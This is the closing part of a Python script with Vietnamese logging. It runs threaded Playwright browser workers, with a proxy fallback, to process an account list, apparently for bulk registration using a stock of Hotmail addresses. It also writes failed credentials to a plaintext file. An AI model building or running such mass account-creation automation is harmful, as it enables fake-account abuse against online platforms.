                        if not browser_initialized:
                            raise Exception("Failed to initialize browser with and without proxy")
                    
                    process_account(browser, context, page, user_data_dir, playwright, account, account_index, hotmails)

                except Exception as e:
                    logging.error(f"Lỗi trong worker thread: {repr(e)}")
                    # Log the account as failed
                    with file_lock:
                        failed_accounts.append({'account': account, 'error': repr(e)})
                        with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                            f.write(f"{account['email']}|{account['password']}|{repr(e)}\n")
                
                finally:
                    if browser and browser in browsers:
                        browsers.remove(browser)
                    account_queue.task_done()
        
        # Start worker threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=worker, name=f"Luồng-{i+1}")
            t.start()
            threads.append(t)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
        
        # Báo cáo cuối cùng và dọn dẹp
        logging.info("Đã xử lý xong tất cả tài khoản.")
        logging.info(f"✅ Đăng ký thành công: {len(successful_accounts)}")
        logging.info(f"❌ Đăng ký thất bại: {len(failed_accounts)}")
        
        clean_all_user_data()
        logging.info("Chương trình hoàn tất. Thoát sau 5 giây...")
        time.sleep(5)
        
    except Exception as e:
        logging.error(f"Lỗi trong hàm main: {repr(e)}")
    finally:
        cleanup_browsers()
        if len(hotmail_need_deletes) > 0:
                try:
                    with file_lock:
                        with open('hotmail.txt', 'r', encoding='utf-8') as f:
                            lines = f.readlines()
                        
                        with open('hotmail.txt', 'w', encoding='utf-8') as f:
                            for line in lines:
                                if line.strip() and not line.startswith('#'):
                                    if line.strip() not in hotmail_need_deletes:
                                        f.write(line)
                                else:
                                    f.write(line)
                        # logging.debug(f"🗑️ Đã xóa {hotmail} khỏi hotmail.txt")
                except Exception as e:
                    pass


if __name__ == "__main__":
    try:
        signal.signal(signal.SIGTERM, cleanup_browsers)
        signal.signal(signal.SIGINT, cleanup_browsers)
        atexit.register(cleanup_browsers)
        main()
    except KeyboardInterrupt:
        logging.info("Nhận KeyboardInterrupt. Đang dọn dẹp...")
        cleanup_browsers()
        clean_all_user_data()
        logging.info("Dọn dẹp hoàn tất. Thoát...")
        sys.exit(0)
